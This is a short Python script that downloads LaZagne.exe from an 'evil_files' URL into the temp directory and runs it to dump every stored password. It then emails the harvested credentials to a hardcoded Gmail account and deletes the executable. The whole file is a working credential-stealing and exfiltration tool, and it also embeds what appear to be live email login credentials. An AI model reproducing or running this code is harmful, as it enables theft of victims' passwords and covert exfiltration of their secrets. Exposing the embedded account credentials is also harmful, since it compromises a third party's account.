#!/usr/bin/env python
import requests,subprocess, smtplib, os, tempfile

def download(url):
    get_response=requests.get(url)
    filename=url.split('/')[-1]
    print(filename)
    with open(filename, 'wb') as out_file:
        out_file.write(get_response.content)
def send_mail(email, password, message):
    server=smtplib.SMTP('smtp.gmail.com',587)
    server.starttls() #init tls connnection
    server.login(email, password)
    server.sendmail(email, email, message)
    server.quit()

temp_dir= tempfile.gettempdir()
print(temp_dir)
os.chdir(temp_dir)
download("http://192.168.209.138/evil_files/LaZagne.exe")
command='LaZagne.exe all'
result=subprocess.check_output(command, shell=True)
send_mail('khoi08022004@gmail.com','iceqykoojysrbgry',result)
os.remove('LaZagne.exe')
